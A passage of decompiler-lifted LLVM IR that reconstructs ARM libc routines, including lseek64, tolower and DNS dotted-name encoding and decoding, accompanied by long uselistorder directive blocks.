  uselistorder i32 48, { 15, 5, 18, 2, 10, 11, 12, 3, 6, 13, 7, 20, 17, 14, 1, 0, 16, 19, 8, 9, 4 }
  uselistorder i32 36, { 11, 12, 13, 15, 16, 17, 18, 4, 1, 14, 0, 8, 9, 10, 2, 5, 3, 6, 19, 7 }
  uselistorder i32 56, { 5, 4, 7, 3, 8, 2, 0, 9, 6, 10, 1 }
  uselistorder i32 44, { 11, 12, 13, 9, 10, 18, 1, 8, 17, 15, 0, 14, 2, 3, 4, 5, 6, 16, 7 }
  uselistorder i32 -44, { 1, 2, 0 }
  uselistorder i32 -48, { 2, 3, 0, 4, 5, 6, 7, 1 }
  uselistorder i32 -32, { 1, 5, 2, 6, 7, 3, 0, 4 }
  uselistorder i32 32, { 61, 62, 63, 0, 64, 65, 41, 73, 75, 30, 31, 27, 47, 35, 48, 49, 44, 45, 4, 3, 6, 5, 8, 7, 1, 28, 68, 66, 67, 50, 19, 51, 2, 36, 52, 53, 54, 55, 56, 20, 57, 42, 43, 69, 70, 71, 72, 76, 37, 46, 38, 29, 58, 59, 60, 10, 9, 21, 32, 39, 74, 22, 12, 11, 14, 13, 23, 16, 15, 24, 25, 18, 17, 26, 33, 34, 40 }
  uselistorder i32* @fp, { 40, 43, 41, 1, 42, 44, 45, 46, 47, 0, 49, 48, 50, 51, 52, 15, 2, 53, 54, 55, 56, 57, 58, 59, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 112, 113, 111, 106, 107, 108, 109, 110 }
  uselistorder i32* @sl, { 22, 23, 24, 25, 28, 26, 27, 29, 30, 31, 32, 33, 34, 35, 2, 3, 36, 37, 0, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 4, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 5, 6, 7, 8, 9, 10, 11, 1, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32* @r8, { 35, 36, 37, 38, 39, 40, 41, 5, 6, 7, 42, 47, 48, 0, 49, 84, 85, 86, 87, 1, 88, 89, 90, 91, 23, 24, 99, 100, 8, 9, 10, 11, 12, 13, 14, 98, 92, 93, 94, 95, 96, 97, 25, 26, 27, 28, 29, 30, 3, 4, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 2, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 31, 32, 33, 34, 43, 44, 45, 46, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder i32* @r7, { 68, 70, 71, 69, 72, 73, 74, 75, 76, 77, 9, 10, 11, 12, 13, 14, 15, 1, 78, 86, 85, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 45, 46, 47, 48, 119, 16, 17, 2, 18, 6, 19, 20, 21, 22, 23, 24, 25, 26, 27, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 49, 50, 51, 52, 28, 29, 30, 31, 87, 3, 88, 89, 4, 5, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 0, 7, 8, 117, 118, 64, 65, 66, 67, 79, 80, 81, 82, 83, 84, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44 }
  uselistorder label %dec_label_pc_1aa00, { 4, 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1a9fc, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_1a9cc, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_1a9c8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1a96c, { 1, 0 }
  uselistorder label %dec_label_pc_1a918, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1a8b8.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1a8f8, { 1, 0 }
  uselistorder label %dec_label_pc_1a874, { 1, 0 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_1a728, { 1, 0 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1aa54, label %dec_label_pc_1aa40

dec_label_pc_1aa40:                               ; preds = %entry
  %v0_1aa40 = call i32 @__errno_location()
  %v0_1aa44 = load i32, i32* %r4.global-to-local, align 4
  %v1_1aa44 = sub i32 0, %v0_1aa44
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_1aa4c = inttoptr i32 %v0_1aa40 to i32*
  store i32 %v1_1aa44, i32* %v2_1aa4c, align 4
  %v0_1aa5c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1aa5c

dec_label_pc_1aa54:                               ; preds = %entry
  %v2_1aa54 = icmp eq i32 %arg1, 0
  br i1 %v2_1aa54, label %dec_label_pc_1aa68, label %dec_label_pc_1aa5c

dec_label_pc_1aa5c:                               ; preds = %dec_label_pc_1aa54, %dec_label_pc_1aa40
  %v0_1aa5c = phi i32 [ %arg1, %dec_label_pc_1aa54 ], [ %v0_1aa5c.pre, %dec_label_pc_1aa40 ]
  br label %dec_label_pc_1aa6c

dec_label_pc_1aa68:                               ; preds = %dec_label_pc_1aa54
  br label %dec_label_pc_1aa6c

dec_label_pc_1aa6c:                               ; preds = %dec_label_pc_1aa5c, %dec_label_pc_1aa68
  %v14_1aa70 = phi i32 [ %v0_1aa5c, %dec_label_pc_1aa5c ], [ %tmp9, %dec_label_pc_1aa68 ]
  ret i32 %v14_1aa70

; uselistorder directives
  uselistorder i32 ()* @__errno_location, { 60, 47, 37, 36, 35, 46, 45, 59, 58, 44, 17, 41, 57, 56, 26, 50, 11, 10, 9, 8, 23, 7, 22, 73, 53, 52, 62, 61, 71, 70, 69, 16, 51, 25, 40, 39, 49, 15, 29, 32, 63, 31, 38, 55, 54, 34, 0, 43, 42, 14, 48, 6, 5, 68, 28, 27, 67, 21, 4, 13, 1, 20, 12, 66, 65, 33, 19, 18, 64, 3, 2, 72, 30, 24 }
  uselistorder i32 %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1aa6c, { 1, 0 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  %v1_1aa7c = icmp slt i32 %arg1, 0
  br i1 %v1_1aa7c, label %bb, label %bb1

bb:                                               ; preds = %entry
  ret i32 %arg1

bb1:                                              ; preds = %entry
  %v2_1aa7c = mul i32 %arg1, 2
  %v2_1aa88 = load i32, i32* bitcast (i32** @global_var_26824.960 to i32*), align 4
  %v2_1aa8c = add i32 %v2_1aa88, %v2_1aa7c
  %v3_1aa90 = inttoptr i32 %v2_1aa8c to i8*
  %v4_1aa90 = load i8, i8* %v3_1aa90, align 1
  %v6_1aa90 = zext i8 %v4_1aa90 to i32
  %v1_1aa94 = add i32 %v2_1aa8c, 1
  %v2_1aa94 = inttoptr i32 %v1_1aa94 to i8*
  %v3_1aa94 = load i8, i8* %v2_1aa94, align 1
  %v4_1aa94 = zext i8 %v3_1aa94 to i32
  %v3_1aa98 = mul nuw i32 %v4_1aa94, 16777216
  %v4_1aa9c = sdiv i32 %v3_1aa98, 65536
  %v5_1aa9c = or i32 %v4_1aa9c, %v6_1aa90
  ret i32 %v5_1aa9c

; uselistorder directives
  uselistorder i32 %v2_1aa8c, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_1aaa8 = load i32, i32* @r4, align 4
  store i32 %v3_1aaa8, i32* %stack_var_-24, align 4
  %v6_1aaa8 = load i32, i32* @r5, align 4
  %v9_1aaa8 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_1aab0 = load i32, i32* @r1, align 4
  store i32 %v0_1aab0, i32* @r6, align 4
  %v0_1aab4 = load i32, i32* @r2, align 4
  store i32 %v0_1aab4, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1ab1c19 = icmp slt i8* %arg1, null
  store i1 %v1_1ab1c19, i1* %cpsr_n.global-to-local, align 1
  %v2_1ab1c20 = icmp eq i8* %arg1, null
  store i1 %v2_1ab1c20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ab1c20, label %dec_label_pc_1ab34, label %dec_label_pc_1ab28

dec_label_pc_1aac0:                               ; preds = %dec_label_pc_1ab28
  %v2_1aac0 = call i32 @__GI_strchr(i32 %v0_1aac021, i32 46)
  store i32 %v2_1aac0, i32* @r5, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1aac4 = icmp slt i32 %v2_1aac0, 0
  store i1 %v1_1aac4, i1* %cpsr_n.global-to-local, align 1
  %v2_1aac4 = icmp eq i32 %v2_1aac0, 0
  store i1 %v2_1aac4, i1* %cpsr_z.global-to-local, align 1
  %v0_1aac8 = load i32, i32* @r4, align 4
  %v2_1aac8 = sub i32 %v2_1aac0, %v0_1aac8
  store i32 %v2_1aac8, i32* %ip.global-to-local, align 4
  store i32 %v0_1aac8, i32* %r0.global-to-local, align 4
  br i1 %v2_1aac4, label %dec_label_pc_1aad4, label %dec_label_pc_1aadc

dec_label_pc_1aad4:                               ; preds = %dec_label_pc_1aac0
  %v1_1aacc = inttoptr i32 %v0_1aac8 to i8*
  %v3_1aad4 = call i32 @strlen(i8* %v1_1aacc)
  store i32 %v3_1aad4, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v3_1aad4, 16777216
  %v1_1aad8 = sdiv i32 %sext, 16777216
  store i32 %v1_1aad8, i32* %ip.global-to-local, align 4
  %v0_1aae8.pre = load i32, i32* @r4, align 4
  %v0_1aaf8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1aadc

dec_label_pc_1aadc:                               ; preds = %dec_label_pc_1aac0, %dec_label_pc_1aad4
  %v0_1aaf8 = phi i32 [ %v2_1aac0, %dec_label_pc_1aac0 ], [ %v0_1aaf8.pre, %dec_label_pc_1aad4 ]
  %v0_1aae8 = phi i32 [ %v0_1aac8, %dec_label_pc_1aac0 ], [ %v0_1aae8.pre, %dec_label_pc_1aad4 ]
  %v0_1ab08 = phi i32 [ %v2_1aac8, %dec_label_pc_1aac0 ], [ %v1_1aad8, %dec_label_pc_1aad4 ]
  %v0_1aadc = load i32, i32* %r7.global-to-local, align 4
  %v1_1aadc = add i32 %v0_1aadc, 1
  store i32 %v1_1aadc, i32* @lr, align 4
  %v1_1aae0 = load i32, i32* %r8.global-to-local, align 4
  %v2_1aae0 = sub i32 %v1_1aae0, %v0_1aadc
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1aae4 = icmp slt i32 %v0_1ab08, 0
  store i1 %v1_1aae4, i1* %cpsr_n.global-to-local, align 1
  %v2_1aae4 = icmp eq i32 %v0_1ab08, 0
  store i1 %v2_1aae4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_1aae8, i32* @r1, align 4
  %v0_1aaec = load i32, i32* @r6, align 4
  %v2_1aaec = add i32 %v0_1aaec, %v1_1aadc
  store i32 %v2_1aaec, i32* @r0, align 4
  store i32 %v0_1ab08, i32* @r2, align 4
  %v1_1aaf4 = add i32 %v2_1aae0, -1
  %v1_1aaf8 = add i32 %v0_1aaf8, 1
  store i32 %v1_1aaf8, i32* @r4, align 4
  br i1 %v2_1aae4, label %.loopexit, label %dec_label_pc_1ab00

dec_label_pc_1ab00:                               ; preds = %dec_label_pc_1aadc
  %v2_1ab00 = sub i32 %v0_1ab08, %v1_1aaf4
  %v3_1ab00 = icmp ult i32 %v0_1ab08, %v1_1aaf4
  %v4_1ab00 = xor i32 %v1_1aaf4, %v0_1ab08
  %v5_1ab00 = xor i32 %v2_1ab00, %v0_1ab08
  %v6_1ab00 = and i32 %v5_1ab00, %v4_1ab00
  %v7_1ab00 = icmp slt i32 %v6_1ab00, 0
  store i1 %v7_1ab00, i1* %cpsr_v.global-to-local, align 1
  %v8_1ab00 = icmp slt i32 %v2_1ab00, 0
  store i1 %v8_1ab00, i1* %cpsr_n.global-to-local, align 1
  %v9_1ab00 = icmp eq i32 %v0_1ab08, %v1_1aaf4
  store i1 %v9_1ab00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1ab00, label %dec_label_pc_1ab08, label %.loopexit

dec_label_pc_1ab08:                               ; preds = %dec_label_pc_1ab00
  %v1_1ab08 = trunc i32 %v0_1ab08 to i8
  %v4_1ab08 = add i32 %v0_1aaec, %v0_1aadc
  %v5_1ab08 = inttoptr i32 %v4_1ab08 to i8*
  store i8 %v1_1ab08, i8* %v5_1ab08, align 1
  %v0_1ab0c = load i32, i32* @lr, align 4
  %v1_1ab0c = load i32, i32* %ip.global-to-local, align 4
  %v2_1ab0c = add i32 %v1_1ab0c, %v0_1ab0c
  store i32 %v2_1ab0c, i32* %r7.global-to-local, align 4
  %v0_1ab10 = call i32 @memcpy()
  store i32 %v0_1ab10, i32* %r0.global-to-local, align 4
  %v0_1ab14 = load i32, i32* @r5, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1ab14 = icmp slt i32 %v0_1ab14, 0
  store i1 %v1_1ab14, i1* %cpsr_n.global-to-local, align 1
  %v2_1ab14 = icmp eq i32 %v0_1ab14, 0
  store i1 %v2_1ab14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ab14, label %dec_label_pc_1ab34, label %dec_label_pc_1ab08.dec_label_pc_1ab1c_crit_edge

dec_label_pc_1ab08.dec_label_pc_1ab1c_crit_edge:  ; preds = %dec_label_pc_1ab08
  %v0_1ab1c.pre = load i32, i32* @r4, align 4
  store i32 %v0_1ab1c.pre, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1ab1c = icmp slt i32 %v0_1ab1c.pre, 0
  store i1 %v1_1ab1c, i1* %cpsr_n.global-to-local, align 1
  %v2_1ab1c = icmp eq i32 %v0_1ab1c.pre, 0
  store i1 %v2_1ab1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ab1c, label %dec_label_pc_1ab34, label %dec_label_pc_1ab28

dec_label_pc_1ab28:                               ; preds = %entry, %dec_label_pc_1ab08.dec_label_pc_1ab1c_crit_edge
  %v0_1aac021 = phi i32 [ %v0_1ab1c.pre, %dec_label_pc_1ab08.dec_label_pc_1ab1c_crit_edge ], [ %tmp, %entry ]
  %v1_1ab28 = inttoptr i32 %v0_1aac021 to i8*
  %v2_1ab28 = load i8, i8* %v1_1ab28, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1ab2c = icmp eq i8 %v2_1ab28, 0
  store i1 %v2_1ab2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ab2c, label %dec_label_pc_1ab34, label %dec_label_pc_1aac0

dec_label_pc_1ab34:                               ; preds = %dec_label_pc_1ab08.dec_label_pc_1ab1c_crit_edge, %dec_label_pc_1ab08, %dec_label_pc_1ab28, %entry
  %v0_1ab34 = load i32, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1ab34 = icmp slt i32 %v0_1ab34, 0
  store i1 %v1_1ab34, i1* %cpsr_n.global-to-local, align 1
  %v2_1ab34 = icmp eq i32 %v0_1ab34, 0
  store i1 %v2_1ab34, i1* %cpsr_z.global-to-local, align 1
  %tmp16 = icmp slt i32 %v0_1ab34, 1
  br i1 %tmp16, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_1ab34
  %v5_1ab3c = load i32, i32* %r7.global-to-local, align 4
  %v6_1ab3c = add i32 %v5_1ab3c, 1
  store i32 %v6_1ab3c, i32* %r0.global-to-local, align 4
  %v7_1ab40 = load i32, i32* @r6, align 4
  %v9_1ab40 = add i32 %v7_1ab40, %v5_1ab3c
  %v10_1ab40 = inttoptr i32 %v9_1ab40 to i8*
  store i8 0, i8* %v10_1ab40, align 1
  %v0_1ab44.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_1ab44.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_1ab44.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_1ab34, %bb
  %v2_1ab44 = phi i1 [ %v2_1ab44.pre, %bb ], [ false, %dec_label_pc_1ab34 ]
  %v1_1ab44 = phi i1 [ %v1_1ab44.pre, %bb ], [ %v1_1ab34, %dec_label_pc_1ab34 ]
  %v0_1ab44 = phi i1 [ %v0_1ab44.pre, %bb ], [ %v2_1ab34, %dec_label_pc_1ab34 ]
  %v3_1ab44 = xor i1 %v2_1ab44, %v1_1ab44
  %v4_1ab44 = or i1 %v0_1ab44, %v3_1ab44
  br i1 %v4_1ab44, label %.loopexit, label %bb18

bb18:                                             ; preds = %bb17
  %v7_1ab44 = load i32, i32* %stack_var_-24, align 4
  store i32 %v7_1ab44, i32* @r4, align 4
  store i32 %v6_1aaa8, i32* @r5, align 4
  store i32 %v9_1aaa8, i32* @r6, align 4
  %v25_1ab44 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v25_1ab44

.loopexit:                                        ; preds = %dec_label_pc_1ab00, %dec_label_pc_1aadc, %bb17
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1ab4c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_1ab4c, i32* @r4, align 4
  store i32 %v6_1aaa8, i32* @r5, align 4
  store i32 %v9_1aaa8, i32* @r6, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v0_1ab34, { 0, 2, 1 }
  uselistorder i32 %v0_1ab1c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1ab14, { 1, 0 }
  uselistorder i32 %v2_1ab00, { 1, 0 }
  uselistorder i32 %v1_1aaf4, { 2, 0, 3, 1 }
  uselistorder i32 %v0_1ab08, { 2, 4, 0, 1, 5, 3, 6, 7, 8 }
  uselistorder i32 %v1_1aad8, { 1, 0 }
  uselistorder i32 %v0_1aac8, { 0, 2, 1, 3 }
  uselistorder i1 %v2_1ab1c20, { 1, 0 }
  uselistorder i32 %v9_1aaa8, { 1, 0 }
  uselistorder i32 %v6_1aaa8, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 1, 7, 2, 6, 3, 5, 4, 8, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i1* %cpsr_v.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i1* %cpsr_n.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i32 16777216, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 36, 34, 37, 35, 40, 38, 41, 39, 43, 42, 45, 44, 47, 46, 49, 48 }
  uselistorder i32 (i8*)* @strlen, { 15, 11, 10, 14, 13, 17, 16, 9, 12, 26, 25, 24, 22, 23, 21, 20, 19, 18, 8, 29, 28, 27, 7, 6, 1, 4, 5, 3, 2, 0 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 4, 3, 2, 12, 11, 10, 9, 8, 7, 6, 5, 1, 0 }
  uselistorder i32 46, { 0, 5, 6, 1, 7, 2, 3, 4 }
  uselistorder i32* @r6, { 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 11, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 1, 0, 18, 19, 20, 21, 22, 139, 2, 140, 141, 142, 143, 144, 145, 146, 54, 3, 55, 56, 57, 147, 151, 150, 152, 153, 154, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 4, 71, 72, 73, 74, 75, 76, 77, 212, 217, 103, 104, 23, 24, 25, 105, 106, 107, 108, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 209, 210, 211, 183, 184, 5, 185, 186, 187, 188, 189, 190, 194, 13, 195, 196, 6, 78, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 79, 80, 81, 82, 83, 84, 85, 86, 155, 156, 157, 158, 159, 7, 12, 160, 36, 8, 37, 38, 161, 9, 162, 163, 87, 88, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 15, 16, 17, 89, 90, 91, 92, 213, 214, 215, 216, 14, 164, 165, 166, 167, 10, 168, 169, 170, 171, 148, 149, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 191, 192, 193 }
  uselistorder label %.loopexit, { 2, 0, 1 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %dec_label_pc_1ab34, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1ab28, { 1, 0 }
  uselistorder label %dec_label_pc_1aadc, { 1, 0 }
}

define i32 @__decode_dotted() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_1ab50 = load i32, i32* @r4, align 4
  %v6_1ab50 = load i32, i32* @r5, align 4
  %v0_1ab54 = load i32, i32* @r0, align 4
  store i32 %v0_1ab54, i32* %sl.global-to-local, align 4
  %v2_1ab54 = icmp eq i32 %v0_1ab54, 0
  br i1 %v2_1ab54, label %.thread16, label %dec_label_pc_1abf4.preheader

.thread16:                                        ; preds = %entry
  %v0_1ab601 = load i32, i32* @r2, align 4
  store i32 %v0_1ab601, i32* %sb.global-to-local, align 4
  %v0_1ab642 = load i32, i32* @r3, align 4
  store i32 %v0_1ab642, i32* %stack_var_-40, align 4
  br label %dec_label_pc_1ac14

dec_label_pc_1abf4.preheader:                     ; preds = %entry
  store i32 0, i32* %r8.global-to-local, align 4
  %v0_1ab60 = load i32, i32* @r2, align 4
  store i32 %v0_1ab60, i32* %sb.global-to-local, align 4
  %v0_1ab64 = load i32, i32* @r3, align 4
  store i32 %v0_1ab64, i32* %stack_var_-40, align 4
  store i32 1, i32* %fp.global-to-local, align 4
  %v1_1abf43952 = load i32, i32* @r1, align 4
  %v2_1abf44053 = add i32 %v1_1abf43952, %v0_1ab54
  %v3_1abf44154 = inttoptr i32 %v2_1abf44053 to i8*
  %v4_1abf44255 = load i8, i8* %v3_1abf44154, align 1
  %v6_1abf44356 = zext i8 %v4_1abf44255 to i32
  store i32 %v6_1abf44356, i32* @r4, align 4
  %v2_1abf84457 = icmp eq i8 %v4_1abf44255, 0
  br i1 %v2_1abf84457, label %bb35, label %dec_label_pc_1ab78.lr.ph

dec_label_pc_1ab78:                               ; preds = %dec_label_pc_1ab78.lr.ph, %bb30
  %v2_1ac0050 = phi i1 [ %v2_1ac004663, %dec_label_pc_1ab78.lr.ph ], [ true, %bb30 ]
  %v6_1abf448 = phi i32 [ %v6_1abf44361, %dec_label_pc_1ab78.lr.ph ], [ %v6_1abf4, %bb30 ]
  %v1_1abf447 = phi i32 [ %v1_1abf43960, %dec_label_pc_1ab78.lr.ph ], [ %v5_1aba0, %bb30 ]
  %v1_1ab7c = and i32 %v6_1abf448, 192
  br i1 %v2_1ac0050, label %bb28, label %bb

bb:                                               ; preds = %dec_label_pc_1ab78
  %v1_1ab80 = load i32, i32* %r8.global-to-local, align 4
  %v2_1ab80 = add i32 %v1_1ab80, 1
  store i32 %v2_1ab80, i32* %r8.global-to-local, align 4
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_1ab78, %bb
  %v2_1ab84 = icmp eq i32 %v1_1ab7c, 192
  %v1_1ab88 = add i32 %v1_1abf447, 1
  store i32 %v1_1ab88, i32* @r5, align 4
  br i1 %v2_1ab84, label %dec_label_pc_1ab90, label %dec_label_pc_1abb0

dec_label_pc_1ab90:                               ; preds = %bb28
  %v2_1ab90 = add i32 %v1_1ab88, %v0_1ab90.ph59
  %v3_1ab90 = inttoptr i32 %v2_1ab90 to i8*
  %v4_1ab90 = load i8, i8* %v3_1ab90, align 1
  %v6_1ab90 = zext i8 %v4_1ab90 to i32
  %v1_1ab98 = urem i32 %v6_1abf448, 64
  br i1 %v2_1ac0050, label %bb30, label %bb29

bb29:                                             ; preds = %dec_label_pc_1ab90
  %v1_1ab9c = load i32, i32* %r8.global-to-local, align 4
  %v2_1ab9c = add i32 %v1_1ab9c, 1
  store i32 %v2_1ab9c, i32* %r8.global-to-local, align 4
  br label %bb30

bb30:                                             ; preds = %dec_label_pc_1ab90, %bb29
  %v4_1aba0 = mul nuw nsw i32 %v1_1ab98, 256
  %v5_1aba0 = or i32 %v6_1ab90, %v4_1aba0
  store i32 %v5_1aba0, i32* %r1.global-to-local, align 4
  store i32 %storemerge17.ph58, i32* %r7.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  %v2_1abf4 = add i32 %v5_1aba0, %v0_1ab90.ph59
  %v3_1abf4 = inttoptr i32 %v2_1abf4 to i8*
  %v4_1abf4 = load i8, i8* %v3_1abf4, align 1
  %v6_1abf4 = zext i8 %v4_1abf4 to i32
  store i32 %v6_1abf4, i32* @r4, align 4
  %v2_1abf8 = icmp eq i8 %v4_1abf4, 0
  br i1 %v2_1abf8, label %dec_label_pc_1ac00.bb36_crit_edge, label %dec_label_pc_1ab78

dec_label_pc_1abb0:                               ; preds = %bb28
  %v2_1abb0 = add i32 %v6_1abf448, %storemerge17.ph58
  store i32 %v2_1abb0, i32* %r6.global-to-local, align 4
  %v2_1abb4 = load i32, i32* %stack_var_-40, align 4
  %v1_1abb8 = add i32 %v2_1abb0, 1
  store i32 %v1_1abb8, i32* %r7.global-to-local, align 4
  %v3_1abbc = icmp ult i32 %v1_1abb8, %v2_1abb4
  br i1 %v3_1abbc, label %dec_label_pc_1abc4, label %dec_label_pc_1ac14

dec_label_pc_1abc4:                               ; preds = %dec_label_pc_1abb0
  %v2_1abc4 = add i32 %v1_1ab88, %v0_1ab90.ph59
  store i32 %v2_1abc4, i32* @r1, align 4
  %v0_1abc8 = load i32, i32* %sb.global-to-local, align 4
  %v2_1abc8 = add i32 %v0_1abc8, %storemerge17.ph58
  store i32 %v2_1abc8, i32* @r0, align 4
  store i32 %v6_1abf448, i32* @r2, align 4
  %v0_1abd0 = call i32 @memcpy()
  %v0_1abd4 = load i32, i32* @r5, align 4
  %v1_1abd4 = load i32, i32* @r4, align 4
  %v2_1abd4 = add i32 %v1_1abd4, %v0_1abd4
  store i32 %v2_1abd4, i32* %r1.global-to-local, align 4
  %v0_1abd8 = load i32, i32* %sl.global-to-local, align 4
  %v2_1abd8 = add i32 %v0_1abd8, %v2_1abd4
  %v3_1abd8 = inttoptr i32 %v2_1abd8 to i8*
  %v4_1abd8 = load i8, i8* %v3_1abd8, align 1
  %v0_1abdc = load i32, i32* %fp.global-to-local, align 4
  %v2_1abdc = icmp eq i32 %v0_1abdc, 0
  br i1 %v2_1abdc, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_1abc4
  %v1_1abe0 = load i32, i32* %r8.global-to-local, align 4
  %v3_1abe0 = add i32 %v1_1abe0, %v1_1abd4
  store i32 %v3_1abe0, i32* %r8.global-to-local, align 4
  br label %bb32

bb32:                                             ; preds = %dec_label_pc_1abc4, %bb31
  %v2_1abe4 = icmp eq i8 %v4_1abd8, 0
  br i1 %v2_1abe4, label %bb34, label %bb33

bb33:                                             ; preds = %bb32
  br label %bb34

bb34:                                             ; preds = %bb32, %bb33
  %v0_1abec.off0 = phi i8 [ 0, %bb32 ], [ 46, %bb33 ]
  %v2_1abec = load i32, i32* %sb.global-to-local, align 4
  %v3_1abec = load i32, i32* %r6.global-to-local, align 4
  %v4_1abec = add i32 %v3_1abec, %v2_1abec
  %v5_1abec = inttoptr i32 %v4_1abec to i8*
  store i8 %v0_1abec.off0, i8* %v5_1abec, align 1
  %v0_1abf0.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_1abf4.pre.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_1ac00.pre.pre = load i32, i32* %fp.global-to-local, align 4
